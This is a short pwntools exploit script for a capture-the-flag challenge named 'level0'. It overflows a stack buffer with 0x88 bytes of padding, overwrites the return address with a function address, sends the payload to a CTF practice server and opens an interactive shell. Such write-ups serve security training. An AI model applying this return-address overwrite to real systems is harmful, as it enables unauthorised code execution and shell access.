from pwn import *

#context.log_level = 'debug'
system_addr = 0x00400596
payload = 'a' * 0x80 + 'a' * 8 + p64(system_addr) 
#r = remote('pwn2.jarvisoj.com',9881) 
r = remote('node3.buuoj.cn',28432)
#r = process('./level0')
r.recvuntil('Hello, World\n')
r.sendline(payload)

r.interactive()
